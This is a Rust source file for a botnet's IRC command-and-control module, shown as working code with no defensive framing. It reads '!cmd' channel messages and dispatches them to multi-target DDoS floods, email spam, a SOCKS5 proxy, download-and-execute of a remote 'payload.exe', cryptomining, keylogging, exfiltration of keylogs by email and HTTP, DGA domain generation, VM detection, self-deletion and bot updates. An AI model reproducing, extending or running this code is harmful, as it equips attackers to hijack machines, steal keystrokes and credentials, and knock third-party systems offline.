use irc::client::prelude::*;
use futures::stream::StreamExt;
use std::error::Error;
use crate::utils::*;
use crate::attacks::ddos_attack;
use crate::config::{CONFIG};

pub async fn irc_c2() -> Result<(), Box<dyn Error + Send + Sync>> {
    let config = {
        let guard = CONFIG.lock().unwrap();
        guard.as_ref().unwrap().clone()
    };
    
    let config_irc = Config {
        nickname: Some(config.irc_nick.clone()),
        server: Some(config.irc_server.clone()),
        channels: vec![config.irc_channel.clone()],
        ..Default::default()
    };

    let mut client = Client::from_config(config_irc).await?;
    client.identify()?;

    let mut stream = client.stream()?;

    while let Some(result) = stream.next().await {
        let message = result?;
        if let Command::PRIVMSG(target, msg) = message.command {
            if target == config.irc_channel && msg.starts_with("!cmd ") {
                let cmd = msg.trim_start_matches("!cmd ").to_string();
                execute_command(cmd).await?;
            }
        }
    }
    Ok(())
}

pub async fn execute_command(cmd: String) -> Result<(), Box<dyn Error + Send + Sync>> {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    match parts[0] {
        "ddos_multi" if parts.len() >= 5 => {
            // !cmd ddos_multi <type> <targets> <port> <duration>
            // targets: ip1,ip2,ip3
            let attack_type = parts[1].to_string();
            let targets_str = parts[2].to_string();
            let port: u16 = parts[3].parse()?;
            let duration: u64 = parts[4].parse()?;
            let targets: Vec<String> = targets_str.split(',').map(|s| s.to_string()).collect();
            for target in targets {
                let at = attack_type.clone();
                let t = target.clone();
                tokio::spawn(async move {
                    ddos_attack(at, t, port, duration).await;
                });
            }
        }
        "spam" if parts.len() >= 3 => {
            let target = parts[1].to_string();
            let count: u32 = parts[2].parse()?;
            tokio::spawn(spam_email(target, count));
        }
        "proxy" if parts.len() >= 2 => {
            let port: u16 = parts[1].parse()?;
            tokio::spawn(start_socks5_proxy(port));
        }
        "download" if parts.len() >= 2 => {
            let url = parts[1].to_string();
            let resp = reqwest::get(&url).await?.bytes().await?;
            std::fs::write("payload.exe", resp)?;
            std::process::Command::new("payload.exe").spawn()?;
        }
        "mine" => {
            tokio::spawn(start_mining());
        }
        "keylog" => {
            start_keylogger();
        }
        "exfil" => {
            tokio::spawn(async {
                if let Err(e) = exfil_keylogs().await {
                    eprintln!("Email exfil error: {}", e);
                }
                if let Err(e) = exfil_http().await {
                    eprintln!("HTTP exfil error: {}", e);
                }
            });
        }
        "dga" => {
            let domains = generate_dga_domains();
            println!("Generated C2 domains: {:?}", domains);
        }
        "antivm" => {
            let is_vm = check_anti_vm().await;
            println!("VM detected: {}", is_vm);
        }
        "selfdelete" => {
            tokio::spawn(self_delete());
        }
        "update" if parts.len() >= 2 => {
            let url = parts[1].to_string();
            tokio::spawn(async move {
                if let Err(e) = update_bot(url).await {
                    eprintln!("Update error: {}", e);
                }
            });
        }
        _ => println!("Unknown command: {}", cmd),
    }
    Ok(())
}